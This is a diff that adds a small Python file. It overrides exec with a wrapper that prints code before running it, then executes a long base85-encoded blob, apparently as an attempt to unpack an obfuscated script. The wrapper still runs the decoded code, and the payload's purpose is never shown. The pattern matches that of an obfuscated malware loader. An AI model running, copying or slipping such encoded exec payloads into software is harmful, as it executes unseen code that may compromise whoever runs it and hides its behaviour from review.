@@ -1,0 +1,9 @@
+# tạo hàm hàm exec mới
+new = exec
+
+def exec(code,gl=None):
+    print(code)
+    if gl:
+        return new(code,gl)
+    return new(code)
+import base64;exec(base64.a85decode(b'Bl.g-Ec`F5@<6!<1co8nARd,t@<6!<1bN2r2.U9.De*E-@OFKY/nZb)@phb`5WgqJ4>C>a3,V#[A1Vgf4>n?F0k*m5E\\]7I3A*^2.RbpS:I[u[05as&.6qic@UM&pB5pO#5!qMB1FuQO><suEB4`taDEgTECFX0Y79j)\'2b>ek.UFk_;IXTD3_<Ou>;.pCF!`LtEG8oJ<D=fZ68`^X,;gWa9gUR(F\\tpu4EGX668W(l@73Os<(0/D=>3l:3GL!J-Sf-pASWnu7Vc?m8Q\\q[1L+1"?p$YP7R\'C4+^duc77T=U8j#L)Am.)P?sZqd4(hW\'3G2>i-q7HHFDu@Z77UH<2E4bdCd9p8:NJWH0J>gW4u7"91Ik+^8hEtR/T=!S=)N.><b"@23)NpcEEb.k75mG#>&e@B79h3W.6Kh7@TkNGCfs211dFGm76Pcc5>".&6")uE1G;HK68EOo=>s561-\\2Z1a+A.E$\\[>1Fb"O75\\.-8oR6F-u(1b0fO,a0hl70/iRZW>UOYI;)U?j79h3E74:Ps;JeQ^D*;KF4"XZ%7m9!oAj8%Z3Fb$;7oEtO5#kBE4#B0=B5g"V-6uGO>@U?%2-=\'o.5YFR5[??a5"6qc2HqRg0JYFl=tqfYFYGR\\<_m9a4\\782>Urr.956%%6u5mV:d%9V1+b7p1.<TH.O7A30kb>XAme2=3GV-#/M^p"BgOXuE)9sq<[_3X831BK2H;S!9g2f05$K^G-Vc<N,>Ufb?9BHB10c29BIQ5B76PBA?m[9b/6-IG/j;?F-9*b1F!FC85t*1G/3[B&>!-/$9ef(A-T+P82cVOd<\'sAM?>)?22(`Z%=[>8e1Ic.r3\'MF12``oR=%mTh6pYrH0kaN03A5;-;-$(R="--j0N:>L6qL9F7P$kkB0e:^FXqB",#g]U3,)>N9.s7P0d]4XDf8o>ED/9)7U\'IuFZ_)t/6+E57UIZ/4u%%41.s_UCdf[3@pMGS<F.=D2G%=Y1dk7t/2fIeE$@VA5\\h]\'5!iLZBJ"-u2bQ%fF[SbW=ZTK#1d+Sf8i\'[gDd,M\',u[Pp@OOu?1L):S<+JEc-7imiEA1BG5!(Ao;)V?$BNmH0EGKYb@6-S.4@2hZ=u%O!76`t;1fQ^jF(KK41g*L)E]Ro?FDj&s1*\\8\'8Om5i7:&&NBgXIpCaLuD-Whug0MF-\'9e^994%hY?-VGX/2f1NE-nmM7<B`Pj1,`Mr>[0^6@6H_[0I\\h`>V9Q/1FYd=<\'j2>-!iho3\\2[7/OjPd6>BV\':GGO=82rtL->#7r=_0?C6ps0gA27XF4A\\C9>$sZLDCIJH5B%ii/21j]5%ZK^/NRl7>:_"\'6S2_N,qL<6EBZBuCfjar,YMH)0e7*?:d.ug2a\'2nCi=&C.n</u0eHp?4?I%L;ar;bB3nD#3)N"Q0e7#u3]\'$50kWWp9-Zh`:e>)35!2%[@Pf9LBlQ$j3H\\UY>:N9=0P5AN2*52:B/VYc:-DQCAjJ%&3)F9B2)]J5=$/3-4!AJu4X**T5$\'704#gnJ:dd`%5V6Y\'10QMU0J>##AM-o$=<Te74)e[g4$Q_J02Xkf904UpF!Nk9=`c_p,=tL75#k?$/3P:\'9-lGZ@8:Vl2/[2C6SV7XA2HVo2K:u<D.$C#A0EKV1Fu3L.53V0=%#566!Z]@10SQ\\4\'jIE-o#9dDaH\'1-RgJ'))
